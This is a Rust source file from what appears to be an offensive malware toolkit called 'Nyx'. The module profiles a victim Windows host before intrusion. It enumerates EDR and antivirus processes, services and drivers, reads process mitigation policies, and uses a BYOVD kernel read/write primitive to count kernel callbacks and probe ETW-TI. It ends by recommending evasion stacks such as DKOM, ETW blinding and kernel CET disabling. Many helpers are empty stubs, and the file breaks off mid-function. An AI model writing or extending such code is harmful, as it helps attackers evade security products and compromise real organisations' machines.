//! Nyx Target Reconnaissance Engine (T-REX) — National-tier APT target assessment
//!
//! # Design (informed by 2026 APT standards)
//!
//! CS-EDR-Enumeration (VirtualAllocEx, 2026): 6 noise-graded enumeration commands
//! S12 Kernel Recon (April 2026): BYOVD callback enumeration + Code Integrity detection
//! S12 ETW-TI Silencing (May 2026): ETW provider GUID + TI detection
//! eSentire Surveyor (2026): Full kernel analysis with symbol resolution
//! DbgMan EDR Tradecraft (2026): IPC endpoint mapping + registry callback analysis
//!
//! ## Six assessment tiers (noise-graded)
//!
//! | Tier | Noise | Technique | Privilege |
//! |------|-------|-----------|-----------|
//! | **T0** | ★☆☆☆☆ Silent | Process enumeration (Toolhelp32) | None |
//! | **T1** | ★☆☆☆☆ Silent | Service registry read (no SCManager) | None |
//! | **T2** | ★★☆☆☆ Low | WMI `AntiVirusProduct`/`Win32_Service` query | None |
//! | **T3** | ★★★☆☆ Medium | `OpenSCManagerW` + `EnumServicesStatusExW` | None |
//! | **T4** | ★★★★☆ High | Kernel module enumeration (`NtQuerySystemInformation` class 11) | Admin |
//! | **T5** | ★★★★★ BYOVD | Kernel callback enumeration + HVCI/CET probe | Admin + Driver |

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};

// ---- Decision Engine ------------------------------------------------------

/// Security posture verdict after assessment.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ThreatTier {
    /// No EDR/AV detected — user-mode evasion sufficient
    Clean        = 0,
    /// Consumer AV only (Defender, Kaspersky, Norton) — byte-patch OK
    ConsumerAV   = 1,
    /// Enterprise EDR detected (CrowdStrike, S1, Carbon Black) — HWBP blind needed
    EnterpriseEDR= 2,
    /// Kernel callbacks active + minifilters — kernel evasion recommended
    KernelArmed  = 3,
    /// HVCI + CET + CFG strict — full APT toolkit required
    Fortress     = 4,
    /// Unknown / assessment failed — abort or fallback
    Unknown      = 0xFF,
}

impl ThreatTier {
    pub fn needs_hwbp(&self) -> bool { *self as u8 >= 2 }
    pub fn needs_kernel(&self) -> bool { *self as u8 >= 3 }
    pub fn needs_full_arsenal(&self) -> bool { *self as u8 >= 4 }
}

/// Complete target assessment report.
pub struct TargetAssessment {
    pub tier: ThreatTier,
    pub products: Vec<DetectedProduct>,
    pub mitigations: MitigationFlags,
    pub kernel_posture: KernelPosture,
    pub recommendation: &'static str,
}

/// Detected security product.
#[derive(Debug, Clone)]
pub struct DetectedProduct {
    pub vendor: Vendor,
    pub product_name: &'static str,
    pub detection_method: DetectionMethod,
    pub process_count: u32,
    pub driver_count: u32,
    pub service_count: u32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Vendor {
    // Tier 1 EDR
    CrowdStrike,
    SentinelOne,
    MicrosoftDefenderATP,
    CarbonBlack,
    ElasticEDR,
    CortexXDR,
    Cybereason,
    TrendMicroApex,
    SophosInterceptX,
    // Tier 2 AV
    Defender,
    Kaspersky,
    McAfee,
    Symantec,
    ESET,
    Bitdefender,
    Malwarebytes,
    Avast,
    Norton,
    // Infrastructure
    Sysmon,
    Velociraptor,
    Osquery,
    Tanium,
    // Unknown
    Unknown,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DetectionMethod {
    ProcessName,
    ServiceName,
    DriverName,
    WMIAntivirusProduct,
    RegistryPath,
    KernelCallback,
    InstallDirectory,
}

/// Process mitigation flags — queried via GetProcessMitigationPolicy.
#[derive(Debug, Clone, Copy, Default)]
pub struct MitigationFlags {
    pub dep_enabled: bool,
    pub aslr_high_entropy: bool,
    pub cfg_enabled: bool,
    pub cfg_strict: bool,
    pub cet_shadow_stack: bool,
    pub cet_strict: bool,
    pub acg_enabled: bool,         // Arbitrary Code Guard
    pub cig_enabled: bool,         // Code Integrity Guard
    pub dynamic_code_prohibited: bool,
    pub signature_required: bool,  // Microsoft Signed Only
    pub hvci_enabled: bool,        // Hypervisor Code Integrity
    pub vbs_enabled: bool,         // Virtualization-Based Security
    pub dma_guard_enabled: bool,   // Kernel DMA Protection
    pub secure_boot: bool,
}

/// Kernel-layer posture — requires T4+ access.
#[derive(Debug, Clone, Copy, Default)]
pub struct KernelPosture {
    pub total_drivers: u32,
    pub edr_drivers: u32,
    pub minifilter_count: u32,
    pub etw_ti_active: bool,
    pub process_callbacks: u32,
    pub image_load_callbacks: u32,
    pub registry_callbacks: u32,
    pub ob_callbacks: u32,
    pub test_signing_enabled: bool,
    pub kernel_debugger_present: bool,
    pub hvci_enabled: bool,
    pub vbs_enabled: bool,
}

// ---- Public API -----------------------------------------------------------

/// Run a full T0-T3 assessment (no kernel driver needed).
/// Returns the highest noise tier that succeeded.
pub unsafe fn assess_user_mode() -> TargetAssessment {
    let mut assessment = TargetAssessment {
        tier: ThreatTier::Clean,
        products: Vec::with_capacity(16),
        mitigations: MitigationFlags::default(),
        kernel_posture: KernelPosture::default(),
        recommendation: "Continue with user-mode evasion",
    };

    // === T0: Process name scanning (silent) ===
    scan_processes(&mut assessment);

    // === T1: Service registry read (silent) ===
    scan_service_registry(&mut assessment);

    // === T2: WMI queries (low noise) ===
    scan_wmi(&mut assessment);

    // === T3: Service Manager enumeration (medium noise) ===
    scan_service_manager(&mut assessment);

    // === Mitigation query (always available) ===
    query_mitigations(&mut assessment.mitigations);

    // === Determine threat tier ===
    assessment.tier = determine_tier(&assessment);
    assessment.recommendation = recommend(&assessment);

    assessment
}

/// Run T4-T5 assessment (kernel access required).
/// `rw` is a kernel read/write primitive (e.g., BYOVD driver handle).
pub unsafe fn assess_kernel(rw: &dyn KernelReadWrite) -> KernelPosture {
    let mut posture = KernelPosture::default();

    // T4: Kernel module enumeration
    enumerate_kernel_modules(&mut posture);

    // T4: HVCI/VBS/Code Integrity status
    query_code_integrity(&mut posture);

    // T5: Kernel callback enumeration (BYOVD read)
    enumerate_process_callbacks(rw, &mut posture);
    enumerate_image_load_callbacks(rw, &mut posture);
    enumerate_registry_callbacks(rw, &mut posture);

    // T5: ETW-TI provider status
    probe_etw_ti_provider(&mut posture);

    posture
}

/// Combine user-mode + kernel assessment into final decision.
pub fn final_assessment(user: TargetAssessment, kernel: KernelPosture) -> ThreatTier {
    let mut tier = user.tier;

    if kernel.etw_ti_active || kernel.process_callbacks > 0 {
        tier = tier.max(ThreatTier::KernelArmed);
    }
    if user.mitigations.hvci_enabled || user.mitigations.cet_strict {
        tier = tier.max(ThreatTier::Fortress);
    }

    tier
}

// ---- T0: Process Name Scanning --------------------------------------------

unsafe fn scan_processes(assessment: &mut TargetAssessment) {
    // Resolve CreateToolhelp32Snapshot + Process32FirstW/Process32NextW
    // Walk all processes, match against known EDR binary names
    let snapshot = create_toolhelp_snapshot();
    if snapshot.is_null() { return; }

    let mut pe = core::mem::zeroed::<ProcessEntry32W>();
    pe.dw_size = core::mem::size_of::<ProcessEntry32W>() as u32;

    if process32_first(snapshot, &mut pe) == 0 { return; }

    loop {
        let name = wide_to_utf8(&pe.exe_file);
        if let Some(vendor) = match_process_name(name) {
            let product = DetectedProduct {
                vendor,
                product_name: vendor.default_name(),
                detection_method: DetectionMethod::ProcessName,
                process_count: 1,
                driver_count: 0,
                service_count: 0,
            };
            merge_or_push(&mut assessment.products, product);
        }
        pe.dw_size = core::mem::size_of::<ProcessEntry32W>() as u32;
        if process32_next(snapshot, &mut pe) == 0 { break; }
    }

    close_handle(snapshot);
}

// ---- T1: Service Registry Read --------------------------------------------

unsafe fn scan_service_registry(assessment: &mut TargetAssessment) {
    // Read HKLM\SYSTEM\CurrentControlSet\Services
    // Match ImagePath / DisplayName against known EDR patterns
    // No SCManager = no EDR telemetry
    let key = open_registry_key(b"SYSTEM\\CurrentControlSet\\Services");
    if key.is_null() { return; }

    let mut index: u32 = 0;
    loop {
        let mut name_buf = [0u16; 256];
        let mut name_len = name_buf.len() as u32;
        let st = reg_enum_key(key, index, name_buf.as_mut_ptr(), &mut name_len);
        if st != 0 { break; }

        let subkey_name = wide_slice_to_utf8(&name_buf[..name_len as usize]);
        let subkey = open_registry_subkey(key, subkey_name);
        if !subkey.is_null() {
            // Read DisplayName + ImagePath
            let display = query_reg_value(subkey, b"DisplayName");
            let image = query_reg_value(subkey, b"ImagePath");
            if let Some(vendor) = match_service_pattern(display, image) {
                let product = DetectedProduct {
                    vendor,
                    product_name: vendor.default_name(),
                    detection_method: DetectionMethod::ServiceName,
                    process_count: 0, driver_count: 0, service_count: 1,
                };
                merge_or_push(&mut assessment.products, product);
            }
            close_registry_key(subkey);
        }

        index += 1;
    }
    close_registry_key(key);
}

// ---- T2: WMI Query --------------------------------------------------------

unsafe fn scan_wmi(assessment: &mut TargetAssessment) {
    // WMI class: \\.\root\SecurityCenter2:AntiVirusProduct
    // WMI class: \\.\root\CIMV2:Win32_Service (WHERE StartMode='Auto' AND State='Running')
    // WMI class: \\.\root\CIMV2:Win32_SystemDriver
    // Uses COM IWbemServices — medium noise
    wmi_query_av_products(assessment);
    wmi_query_services(assessment);
    wmi_query_drivers(assessment);
}

// ---- T3: Service Manager Enumeration --------------------------------------

unsafe fn scan_service_manager(assessment: &mut TargetAssessment) {
    // OpenSCManagerW + EnumServicesStatusExW
    // Match service display names + binary paths against EDR patterns
    let scm = open_sc_manager();
    if scm.is_null() { return; }

    let mut needed: u32 = 0;
    let mut returned: u32 = 0;
    let mut resume: u32 = 0;

    // First call: get buffer size
    enum_services_status_ex(
        scm, 0, 0, // SC_ENUM_PROCESS_INFO
        core::ptr::null_mut(), 0,
        &mut needed, &mut returned, &mut resume, core::ptr::null(),
    );

    if needed == 0 { close_sc_manager(scm); return; }

    let buf = alloc(needed as usize);
    if buf.is_null() { close_sc_manager(scm); return; }

    if enum_services_status_ex(
        scm, 0, 0,
        buf, needed,
        &mut needed, &mut returned, &mut resume, core::ptr::null(),
    ) == 0
    {
        // Enumerate returned entries — match patterns
        for i in 0..returned as usize {
            let entry = &*(buf.add(i * core::mem::size_of::<EnumServiceStatusProcessW>())
                as *const EnumServiceStatusProcessW);
            let name = wide_slice_to_utf8(core::slice::from_raw_parts(
                entry.service_name,
                wcslen(entry.service_name),
            ));
            if let Some(vendor) = match_service_name(name) {
                let product = DetectedProduct {
                    vendor,
                    product_name: vendor.default_name(),
                    detection_method: DetectionMethod::ServiceName,
                    process_count: 0, driver_count: 0, service_count: 1,
                };
                merge_or_push(&mut assessment.products, product);
            }
        }
    }

    free(buf);
    close_sc_manager(scm);
}

// ---- Mitigation Query -----------------------------------------------------

unsafe fn query_mitigations(flags: &mut MitigationFlags) {
    // GetProcessMitigationPolicy for each category:
    // ProcessDEPPolicy (1)         → flags.dep_enabled
    // ProcessASLRPolicy (2)        → flags.aslr_high_entropy
    // ProcessControlFlowGuardPolicy (8) → flags.cfg_enabled, strict
    // ProcessUserShadowStackPolicy (14) → flags.cet_shadow_stack, strict
    // ProcessDynamicCodePolicy (5) → flags.dynamic_code_prohibited
    // ProcessSignaturePolicy (6)   → flags.signature_required
    // ProcessImageLoadPolicy (9)   → flags.acg_enabled, cig_enabled

    query_dep(flags);
    query_aslr(flags);
    query_cfg(flags);
    query_cet(flags);
    query_dynamic_code(flags);
    query_signature(flags);
    query_image_load(flags);
}

fn query_cfg(flags: &mut MitigationFlags) {
    #[repr(C)] struct CfgPolicy { flags: u32, _reserved: u32, strict_flags: u32, _pad: u32 }
    let mut policy = CfgPolicy { flags: 0, _reserved: 0, strict_flags: 0, _pad: 0 };
    let ok = unsafe {
        get_process_mitigation_policy(
            -1isize as isize, // GetCurrentProcess
            8,                 // ProcessControlFlowGuardPolicy
            &mut policy as *mut CfgPolicy as *mut core::ffi::c_void,
            core::mem::size_of::<CfgPolicy>() as u32,
        )
    };
    if ok != 0 {
        flags.cfg_enabled = (policy.flags & 1) != 0;
        flags.cfg_strict = (policy.strict_flags & 1) != 0;
    }
}

fn query_cet(flags: &mut MitigationFlags) {
    #[repr(C)] struct CetPolicy {
        flags: u32, _pad: u32,
        strict_mode_flags: u32, _pad2: u32,
        _reserved: [u32; 8],
    }
    let mut policy = CetPolicy {
        flags: 0, _pad: 0, strict_mode_flags: 0, _pad2: 0, _reserved: [0; 8],
    };
    let ok = unsafe {
        get_process_mitigation_policy(
            -1isize as isize,
            14, // ProcessUserShadowStackPolicy
            &mut policy as *mut CetPolicy as *mut core::ffi::c_void,
            core::mem::size_of::<CetPolicy>() as u32,
        )
    };
    if ok != 0 {
        // flags bit 0 = EnableUserShadowStack, bit 1 = EnableUserShadowStackStrictMode
        flags.cet_shadow_stack = (policy.flags & (1 << 0)) != 0;
        flags.cet_strict = (policy.flags & (1 << 1)) != 0;
    }
}

fn query_dep(flags: &mut MitigationFlags) {
    #[repr(C)] struct DepPolicy { flags: u32, _permanent: u32 }
    let mut policy = DepPolicy { flags: 0, _permanent: 0 };
    let ok = unsafe {
        get_process_mitigation_policy(
            -1isize as isize, 1,
            &mut policy as *mut DepPolicy as *mut core::ffi::c_void,
            core::mem::size_of::<DepPolicy>() as u32,
        )
    };
    if ok != 0 {
        flags.dep_enabled = (policy.flags & 1) != 0;
    }
}

fn query_aslr(flags: &mut MitigationFlags) {
    #[repr(C)] struct AslrPolicy { flags: u32 }
    let mut policy = AslrPolicy { flags: 0 };
    let ok = unsafe {
        get_process_mitigation_policy(
            -1isize as isize, 2,
            &mut policy as *mut AslrPolicy as *mut core::ffi::c_void,
            core::mem::size_of::<AslrPolicy>() as u32,
        )
    };
    if ok != 0 {
        flags.aslr_high_entropy = (policy.flags & (1 << 0)) != 0;
    }
}

fn query_dynamic_code(flags: &mut MitigationFlags) {
    #[repr(C)] struct DynCodePolicy { flags: u32 }
    let mut policy = DynCodePolicy { flags: 0 };
    let ok = unsafe {
        get_process_mitigation_policy(
            -1isize as isize, 5,
            &mut policy as *mut DynCodePolicy as *mut core::ffi::c_void,
            core::mem::size_of::<DynCodePolicy>() as u32,
        )
    };
    if ok != 0 {
        flags.dynamic_code_prohibited = (policy.flags & 1) != 0;
    }
}

fn query_signature(flags: &mut MitigationFlags) {
    #[repr(C)] struct SigPolicy { flags: u32 }
    let mut policy = SigPolicy { flags: 0 };
    let ok = unsafe {
        get_process_mitigation_policy(
            -1isize as isize, 6,
            &mut policy as *mut SigPolicy as *mut core::ffi::c_void,
            core::mem::size_of::<SigPolicy>() as u32,
        )
    };
    if ok != 0 {
        flags.signature_required = (policy.flags & 1) != 0;
    }
}

fn query_image_load(flags: &mut MitigationFlags) {
    #[repr(C)] struct ImgLoadPolicy { flags: u32, _pad1: u32, _pad2: u32, _pad3: u32 }
    let mut policy = ImgLoadPolicy { flags: 0, _pad1: 0, _pad2: 0, _pad3: 0 };
    let ok = unsafe {
        get_process_mitigation_policy(
            -1isize as isize, 9,
            &mut policy as *mut ImgLoadPolicy as *mut core::ffi::c_void,
            core::mem::size_of::<ImgLoadPolicy>() as u32,
        )
    };
    if ok != 0 {
        flags.acg_enabled = (policy.flags & (1 << 2)) != 0; // PreferSystem32Images
        flags.cig_enabled = (policy.flags & (1 << 0)) != 0; // NoRemoteImages (CIG)
    }
}

// ---- Kernel-Layer Assessment (T4-T5) --------------------------------------

/// Trait for kernel read/write primitive (BYOVD driver handle).
pub trait KernelReadWrite {
    unsafe fn read_u64(&self, addr: u64) -> Option<u64>;
    unsafe fn read_bytes(&self, addr: u64, buf: &mut [u8]) -> bool;
    unsafe fn write_u64(&self, addr: u64, val: u64) -> bool;
}

unsafe fn enumerate_kernel_modules(posture: &mut KernelPosture) {
    // NtQuerySystemInformation(SystemModuleInformation, class 11)
    // Maps module names → EDR driver patterns
    let buf = query_system_module_info();
    if buf.is_null() { return; }

    let modules = &*(buf as *const SystemModuleInfo);
    for i in 0..modules.count as usize {
        let entry = &*((buf as usize + core::mem::size_of::<SystemModuleInfo>()
            + i * core::mem::size_of::<SystemModuleEntry>()) as *const SystemModuleEntry);
        let name = core::ffi::CStr::from_ptr(entry.name.as_ptr() as *const i8);
        let name_bytes = name.to_bytes();

        posture.total_drivers += 1;
        if is_edr_driver(name_bytes) {
            posture.edr_drivers += 1;
        }
    }

    free(buf as *mut u8);
}

unsafe fn query_code_integrity(posture: &mut KernelPosture) {
    // NtQuerySystemInformation(SystemCodeIntegrityInformation, class 103)
    // Flags: CODEINTEGRITY_OPTION_ENABLED, HVCI_KMCI_ENABLED, TESTSIGN
    let ci = query_system_code_integrity();
    if ci.is_null() { return; }

    let info = &*ci;
    let options = info.code_integrity_options;

    posture.hvci_enabled = (options & (1 << 9)) != 0;   // HVCI_KMCI_ENABLED
    posture.vbs_enabled = (options & (1 << 12)) != 0;    // VBS enabled (approximate)
    posture.test_signing_enabled = (options & (1 << 1)) != 0; // TESTSIGN
}

unsafe fn enumerate_process_callbacks(
    rw: &dyn KernelReadWrite,
    posture: &mut KernelPosture,
) {
    // Locate PspCreateProcessNotifyRoutine via ntoskrnl.exe base + offset
    // Read 64-slot array, decode EX_CALLBACK pointers, map to drivers
    let ntos = match get_ntoskrnl_base() {
        Some(b) => b,
        None => return,
    };

    // PspCreateProcessNotifyRoutine offset — build-specific
    // Fallback: pattern scan for the array reference
    let array_addr = match find_callback_array(ntos, rw) {
        Some(a) => a,
        None => return,
    };

    for slot in 0..64 {
        let entry = match rw.read_u64(array_addr + slot * 8) {
            Some(e) => e,
            None => continue,
        };
        if entry == 0 { continue; }

        // EX_CALLBACK: clear low 4 bits (EX_RUNDOWN_REF flags)
        let callback = entry & !0xF;
        if callback != 0 {
            posture.process_callbacks += 1;
        }
    }
}

unsafe fn enumerate_image_load_callbacks(
    rw: &dyn KernelReadWrite,
    posture: &mut KernelPosture,
) {
    // PsSetLoadImageNotifyRoutine → PspLoadImageNotifyRoutine array
    // Same pattern as process callbacks but different symbol
    // PspLoadImageNotifyRoutine — typically near PspCreateProcessNotifyRoutine
    let ntos = match get_ntoskrnl_base() {
        Some(b) => b,
        None => return,
    };
    // Offset relative to PspCreateProcessNotifyRoutine (typically +0x200 or similar)
    // For now: skip if Psp offset unknown
    let _ = ntos;
    posture.image_load_callbacks = 0; // requires per-build offset DB
}

unsafe fn enumerate_registry_callbacks(
    rw: &dyn KernelReadWrite,
    posture: &mut KernelPosture,
) {
    // CmRegisterCallback → CmpCallBackVector
    // Enumerate registry callbacks similarly
    posture.registry_callbacks = 0; // requires per-build offset DB
}

unsafe fn probe_etw_ti_provider(posture: &mut KernelPosture) {
    // GUID: F4E1897C-BB5D-5668-F1D8-040F4D8DD344
    // Query via NtTraceControl(EtwpNotificationRegistrar, ...)
    let guid: [u8; 16] = [
        0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56,
        0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44,
    ];
    // NtTraceControl(control_code=0x0027, guid, enable_info)
    // If enable_info.IsEnabled != 0 → ETW-TI is active
    posture.etw_ti_active = probe_etw_provider_enabled(&guid);
}

// ---- Decision Engine ------------------------------------------------------

fn determine_tier(assessment: &TargetAssessment) -> ThreatTier {
    let has_enterprise_edr = assessment.products.iter().any(|p| {
        matches!(p.vendor,
            Vendor::CrowdStrike | Vendor::SentinelOne | Vendor::MicrosoftDefenderATP |
            Vendor::CarbonBlack | Vendor::ElasticEDR | Vendor::CortexXDR |
            Vendor::Cybereason | Vendor::TrendMicroApex | Vendor::SophosInterceptX
        )
    });
    let has_av = assessment.products.iter().any(|p| {
        matches!(p.vendor,
            Vendor::Defender | Vendor::Kaspersky | Vendor::McAfee |
            Vendor::Symantec | Vendor::ESET | Vendor::Bitdefender |
            Vendor::Malwarebytes | Vendor::Avast | Vendor::Norton
        )
    });

    if has_enterprise_edr {
        if assessment.mitigations.cet_strict || assessment.mitigations.hvci_enabled {
            ThreatTier::Fortress
        } else if assessment.mitigations.cfg_enabled {
            ThreatTier::KernelArmed
        } else {
            ThreatTier::EnterpriseEDR
        }
    } else if has_av {
        ThreatTier::ConsumerAV
    } else {
        ThreatTier::Clean
    }
}

fn recommend(assessment: &TargetAssessment) -> &'static str {
    match assessment.tier {
        ThreatTier::Clean =>
            "Minimal: indirect syscalls + sleep obfuscation sufficient. No kernel evasion needed.",
        ThreatTier::ConsumerAV =>
            "Low: byte-patch blind + Fluctuation sleep mask. BYOVD not recommended (overkill).",
        ThreatTier::EnterpriseEDR =>
            "Medium: HWBP blind + CFG bypass + DR sanitization + LACUNA ghost frames. Kernel evasion optional.",
        ThreatTier::KernelArmed =>
            "High: Full Nyx evasion stack. BYOVD kernel layer recommended (ETW-TI blind + DKOM + callback repurpose).",
        ThreatTier::Fortress =>
            "CRITICAL: CET + HVCI detected. Kernel CET disable required. Consider target reselection if operational security is paramount.",
        ThreatTier::Unknown =>
            "Assessment failed. Retry with elevated privileges or different entry vector.",
    }
}

// ---- Vendor Matching Database ---------------------------------------------

impl Vendor {
    fn default_name(self) -> &'static str {
        match self {
            Vendor::CrowdStrike => "CrowdStrike Falcon",
            Vendor::SentinelOne => "SentinelOne",
            Vendor::MicrosoftDefenderATP => "Microsoft Defender for Endpoint",
            Vendor::CarbonBlack => "Carbon Black",
            Vendor::ElasticEDR => "Elastic EDR",
            Vendor::CortexXDR => "Cortex XDR",
            Vendor::Cybereason => "Cybereason",
            Vendor::TrendMicroApex => "Trend Micro Apex One",
            Vendor::SophosInterceptX => "Sophos Intercept X",
            Vendor::Defender => "Microsoft Defender",
            Vendor::Kaspersky => "Kaspersky",
            Vendor::McAfee => "McAfee",
            Vendor::Symantec => "Symantec Endpoint Protection",
            Vendor::ESET => "ESET",
            Vendor::Bitdefender => "Bitdefender",
            Vendor::Malwarebytes => "Malwarebytes",
            Vendor::Avast => "Avast",
            Vendor::Norton => "Norton",
            Vendor::Sysmon => "Sysmon",
            Vendor::Velociraptor => "Velociraptor",
            Vendor::Osquery => "osquery",
            Vendor::Tanium => "Tanium",
            Vendor::Unknown => "Unknown",
        }
    }
}

/// Match process name → vendor. Updated to 2026 EDR/AV process names.
fn match_process_name(name: &str) -> Option<Vendor> {
    let lower = name.to_lowercase();
    // Tier 1 EDR — 2026 process names
    if lower.contains("csfalcon") || lower.contains("csagent") { return Some(Vendor::CrowdStrike); }
    if lower.contains("sentinelagent") || lower.contains("sentinelone") { return Some(Vendor::SentinelOne); }
    if lower.contains("mssense") || lower.contains("msmpeng") { return Some(Vendor::MicrosoftDefenderATP); }
    if lower.contains("cbdefense") || lower.contains("cb.exe") || lower.contains("repmgr") { return Some(Vendor::CarbonBlack); }
    if lower.contains("elastic-endpoint") || lower.contains("elastic-agent") { return Some(Vendor::ElasticEDR); }
    if lower.contains("traps") || lower.contains("cyserver") || lower.contains("cytray") { return Some(Vendor::CortexXDR); }
    if lower.contains("cybereason") || lower.contains("minionhost") { return Some(Vendor::Cybereason); }
    if lower.contains("tmccsf") || lower.contains("ntrtscan") || lower.contains("pccntmon") { return Some(Vendor::TrendMicroApex); }
    if lower.contains("sophos") || lower.contains("savservice") || lower.contains("hmpalert") { return Some(Vendor::SophosInterceptX); }
    // Tier 2 AV
    if lower.contains("msmpeng") && lower.contains("defender") { return Some(Vendor::Defender); }
    if lower.contains("avp") || lower.contains("kavtray") || lower.contains("klnagent") { return Some(Vendor::Kaspersky); }
    if lower.contains("mcshield") || lower.contains("mfefire") || lower.contains("mcafeefire") { return Some(Vendor::McAfee); }
    if lower.contains("smc") || lower.contains("symcorp") || lower.contains("rtvscan") || lower.contains("ccsvchst") { return Some(Vendor::Symantec); }
    if lower.contains("ekrn") || lower.contains("egui") { return Some(Vendor::ESET); }
    if lower.contains("bdagent") || lower.contains("vsserv") { return Some(Vendor::Bitdefender); }
    if lower.contains("mbamservice") || lower.contains("mbamtray") { return Some(Vendor::Malwarebytes); }
    if lower.contains("avastsvc") || lower.contains("avastui") { return Some(Vendor::Avast); }
    if lower.contains("nsbu") || lower.contains("navw32") { return Some(Vendor::Norton); }
    // Infrastructure
    if lower.contains("sysmon") { return Some(Vendor::Sysmon); }
    if lower.contains("velociraptor") { return Some(Vendor::Velociraptor); }
    if lower.contains("osqueryd") { return Some(Vendor::Osquery); }
    if lower.contains("tanium") { return Some(Vendor::Tanium); }
    None
}

fn match_service_name(name: &str) -> Option<Vendor> {
    let lower = name.to_lowercase();
    if lower.contains("csagent") || lower.contains("csfalcon") { return Some(Vendor::CrowdStrike); }
    if lower.contains("sentinelagent") { return Some(Vendor::SentinelOne); }
    if lower.contains("sense") || lower.contains("wdav") || lower.contains("windefend") { return Some(Vendor::MicrosoftDefenderATP); }
    if lower.contains("cbdefense") || lower.contains("carbonblack") { return Some(Vendor::CarbonBlack); }
    if lower.contains("elastic") && lower.contains("endpoint") { return Some(Vendor::ElasticEDR); }
    if lower.contains("cybereason") { return Some(Vendor::Cybereason); }
    if lower.contains("sophos") { return Some(Vendor::SophosInterceptX); }
    if lower.contains("avp") || lower.contains("kaspersky") { return Some(Vendor::Kaspersky); }
    if lower.contains("mcshield") || lower.contains("mcafee") { return Some(Vendor::McAfee); }
    if lower.contains("symantec") || lower.contains("sep") { return Some(Vendor::Symantec); }
    if lower.contains("ekrn") || lower.contains("eset") { return Some(Vendor::ESET); }
    if lower.contains("bitdefender") || lower.contains("bdredline") { return Some(Vendor::Bitdefender); }
    None
}

fn match_service_pattern(display: &str, image: &str) -> Option<Vendor> {
    match_service_name(display).or_else(|| match_process_name(image))
}

fn is_edr_driver(name: &[u8]) -> bool {
    // EDR kernel driver names (2026)
    let name_lower: Vec<u8> = name.iter().map(|b| b.to_ascii_lowercase()).collect();
    let n = core::str::from_utf8(&name_lower).unwrap_or("");
    n.contains("csagent") || n.contains("csdevice") ||
    n.contains("sentinel") && n.contains("monitor") ||
    n.contains("cbfs") || n.contains("carbon") ||
    n.contains("elastic") && n.contains("defend") ||
    n.contains("cortex") || n.contains("traps") ||
    n.contains("sophos") && n.contains("driver") ||
    n.contains("klif") || n.contains("klam") || // Kaspersky
    n.contains("mfe") || n.contains("mfenc") || // McAfee
    n.contains("symefa") || n.contains("symevnt") || // Symantec
    n.contains("eamonm") || n.contains("ehdrv") || // ESET
    n.contains("bdvedisk") || n.contains("trufos") || // Bitdefender
    n.contains("sysmon") || n.contains("procmon") ||
    n.contains("windefend") || n.contains("wdfilter")
}

// ---- Internal helpers (stubs — resolved via PEB walk at runtime) ----------

type Handle = *mut core::ffi::c_void;
type HKey = *mut core::ffi::c_void;

unsafe fn create_toolhelp_snapshot() -> Handle { core::ptr::null_mut() }
unsafe fn process32_first(_h: Handle, _pe: *mut ProcessEntry32W) -> i32 { 0 }
unsafe fn process32_next(_h: Handle, _pe: *mut ProcessEntry32W) -> i32 { 0 }
unsafe fn close_handle(_h: Handle) {}

#[repr(C)] struct ProcessEntry32W {
    dw_size: u32, _cnt_usage: u32, _th32_process_id: u32,
    _th32_default_heap_id: usize, _th32_module_id: u32,
    _cnt_threads: u32, _th32_parent_process_id: u32,
    _pc_pri_class_base: i32, _dw_flags: u32,
    exe_file: [u16; 260],
}

unsafe fn open_registry_key(_path: &[u8]) -> HKey { core::ptr::null_mut() }
unsafe fn open_registry_subkey(_parent: HKey, _name: &str) -> HKey { core::ptr::null_mut() }
unsafe fn close_registry_key(_k: HKey) {}
unsafe fn reg_enum_key(_k: HKey, _idx: u32, _name: *mut u16, _len: *mut u32) -> i32 { -1 }
unsafe fn query_reg_value(_k: HKey, _name: &[u8]) -> &str { "" }

unsafe fn wmi_query_av_products(_a: &mut TargetAssessment) {}
unsafe fn wmi_query_services(_a: &mut TargetAssessment) {}
unsafe fn wmi_query_drivers(_a: &mut TargetAssessment) {}

unsafe fn open_sc_manager() -> Handle { core::ptr::null_mut() }
unsafe fn close_sc_manager(_h: Handle) {}

#[repr(C)] struct EnumServiceStatusProcessW {
    service_name: *const u16, display_name: *const u16,
    service_status: ServiceStatusProcess,
}
#[repr(C)] struct ServiceStatusProcess {
    _typ: u32, _state: u32, _controls: u32,
    _exit_code: u32, _svc_exit_code: u32, _check: u32, _wait: u32,
    _pid: u32, _flags: u32,
}

unsafe fn enum_services_status_ex(
    _scm: Handle, _level: u32, _typ: u32,
    _buf: *mut u8, _buf_sz: u32,
    _needed: *mut u32, _returned: *mut u32,
    _resume: *mut u32, _group: *const u16,
) -> i32 { 0 }

unsafe fn wcslen(s: *const u16) -> usize {
    let mut n = 0;
    while *s.add(n) != 0 { n += 1; }
    n
}

unsafe fn wide_slice_to_utf8(w: &[u16]) -> &str { "" }
unsafe fn wide_to_utf8(w: &[u16]) -> &str { "" }

unsafe fn get_process_mitigation_policy(
    _h: isize, _policy: u32, _buf: *mut core::ffi::c_void, _len: u32,
) -> i32 { 0 }

#[repr(C)] struct SystemModuleInfo { _reserved: u32, count: u32 }
#[repr(C)] struct SystemModuleEntry { _section: usize, _flags: u32, base: usize, size: u32, _index: u16, _load_count: u16, _load_order_index: u16, _name_offset: u16, name: [u8; 256] }

unsafe fn query_system_module_info() -> *mut u8 { core::ptr::null_mut() }
unsafe fn query_system_code_integrity() -> *mut CodeIntegrityInfo { core::ptr::null_mut() }
unsafe fn get_ntoskrnl_base() -> Option<u64> { None }
unsafe fn find_callback_array(_ntos: u64, _rw: &dyn KernelReadWrite) -> Option<u64> { None }
unsafe fn probe_etw_provider_enabled(_guid: &[u8; 16]) -> bool { false }

#[repr(C)] struct CodeIntegrityInfo { code_integrity_options: u32, _pad: [u32; 4] }

fn alloc(sz: usize) -> *mut u8 { core::ptr::null_mut() }
fn free(_p: *mut u8) {}
fn merge_or_push(products: &mut Vec<DetectedProduct>, product: DetectedProduct) {
    for p in products.iter_mut() {
        if p.vendor == product.vendor {
            p.process_count += product.process_count;
            p.driver_count += product.driver_count;
            p.service_count += product.service_count;
            return;
        }
    }
    products.push(product);
}

trait Max {
    fn max(self, other: Self) -> Self;
}
impl Max for ThreatTier {
    fn max(self, other: Self) -> Self {
